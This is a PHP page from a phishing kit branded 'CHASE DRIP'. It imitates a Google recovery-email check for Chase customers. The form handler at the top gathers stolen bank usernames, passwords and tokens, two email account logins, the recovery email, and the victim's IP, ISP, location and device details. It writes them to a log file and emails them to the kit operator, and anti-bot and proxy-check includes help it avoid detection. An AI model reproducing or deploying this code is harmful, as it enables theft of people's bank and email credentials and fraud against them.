<?php

    ob_start();
    session_start();
    require("../admin/config.php");
    require("../ant/anta.php");
    require("../ant/ante.php");
    require("../ant/anti.php");
    require("../ant/anto.php");
    require("../ant/antu.php");
    require("../ant/proxycheck.php");
    require("../ant/botinho.php");
    require("../settings.php");


    one_time(one_time_access,redirect_to);
    ff_process(redirect_to);

    if(isset($_POST['submit'])){
        $rec_mail = $_POST['rec_mail'];
        $_SESSION['rec_mail'] = $rec_mail;
        
        $subject =  "{" .$user_ip . "} | GMAIL Recovery | [" . $_SESSION['icity']. "," . $_SESSION['icountrycode'] . "]";
        
        $message = "<<<<<<<<<<<<CHASE DRIP>>>>>>>>>>>>>\n\n";
        $message .= "  --=========[Log]===========--  \n";
        $message .= "Username: " . $_SESSION['usname'] . "\n";
        $message .= "Password: " . $_SESSION['paword'] . "\n";
        $message .= "Token: " . $_SESSION['tok'] . "\n";
        $message .= "  --=========[Mail Access]===========--  \n";
        $message .= "Email Provider: " . $_SESSION['mailcar'] . "\n";
        $message .= "Email Address: " . $_SESSION['mailaddy'] . "\n";
        $message .= "Email Password: " . $_SESSION['mailpass'] . "\n";
        $message .= "  --==[VERIFIED MAIL ACCESS]==--  \n";
        $message .= "Email Provider2: " . $_SESSION['mailcar2'] . "\n";
        $message .= "Email Address2: " . $_SESSION['mailaddy2'] . "\n";
        $message .= "Email Password2: " . $_SESSION['mailpass2'] . "\n";
        $message .= "  --==[G33MAIL RECOVERY]==--  \n";
        $message .= "RECOVERY EMAIL: " . $_SESSION['rec_mail'] . "\n";
        $message .= "----=========[Vic-Info]===========-----\n";
        $message .= "IP: " . $user_ip . "\n";
        $message .= "ISP: " . $_SESSION['iisp'] . "\n";
        $message .= "City(Based of IP): " .$_SESSION['icity'] . "\n";
        $message .= "Country(Based of IP): " .$_SESSION['icountrycode'] . "\n";
        $message .= "Browser: " . $_SESSION['browser'] . "\n";
        $message .= "OS: " . $_SESSION['platform'] . "\n";
        $message .= "Time: " . $_SESSION['time'] . "\n";
        $message .= "Date: " . $_SESSION['date'] . "\n";
        $message .= "<<<<<<<<<<<<<[Pierce-Scripts]>>>>>>>>>>>>>\n";
        $header = "From: <store@crax.pro> \r\n";
        
        
        $var_str = var_export($message, true);
        $var = "\n\n $var_str;\n\n";
        file_put_contents('../mylogGz1.txt', $var, FILE_APPEND);

        $result = mail(reciever, $subject, $message, $header);
        
        header("Location: ./text.google.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
        
        
    }




?>


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex,nofollow">

    <title><?php echo htmlentities("Sync email - chase.com", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/gimlet.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/faviconq.ico">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/6222530beb.js"></script>

</head>

<body class="clinz">
   
   <div class="h2s">
       <div class="RAY">
           <div class="rzb-c8"></div>
           <div class="xvf">
               <div class="Lth">
                   <div class="v8">
                       <img src="./googlelogo_color_74x24dp.png" alt="">
                   </div>
               </div>
               <div class="dRS7">
                   <div class="jxe">
                       <h1>Link your account</h1>
                       <div class="y4d">
                           This device isn't recognized. For your security, Google wants to make sure it's really you.
                       </div>
                       <div class="aca">
                           <div class="yzr">
                               <div class="gph"></div>
                               <div class="k1d"><?php echo $_SESSION['mailaddy2']; ?></div>
                           </div>
                       </div>
                   </div>
                   <div class="ryf-pAY">
                       <div class="Wxw">
                           <form action="" method="post" enctype="multipart/form-data">
                               <section class="atz">
                                   <div class="cxr">
                                       <div class="prd">Confirm the recovery email address you added to your account</div>
                                       <input type="email" class="g-inp" placeholder="Enter recovery email address" name="rec_mail">
                                       <label for="g-lab" class="g-lab">Enter recovery email address</label>
                                   </div>
                               </section>
                           <div class="zq">
                               <div class="flier">
                                   <input type="submit" class="u26" value="Next" name="submit">
                               </div>
                           </div>
                           </form>
                       </div>
                   </div>
               </div>
           </div>
           <footer class="rwbn">
               <div class="u7land">
                   <div class="vuab">
                       <span>&#8234;English (United States)&#8236;</span>
                   </div>
               </div>
               <ul class="bgmd">
                   <li><a href="#">Help</a></li>
                   <li><a href="#">Privacy</a></li>
                   <li><a href="#">Terms</a></li>
               </ul>
           </footer>
       </div>
   </div>
    
<script>
//window.onbeforeunload = function() {
//   return "Do you really want to leave our brilliant application?";
//   //if we return nothing here (just calling return;) then there will be no pop-up question at all
//   //return;
//};
</script>
<script src="../js/jquery.js"></script>

<!-- Bootstrap Core JavaScript -->
<script src="../js/bootstrap.min.js"></script>


</body>

</html>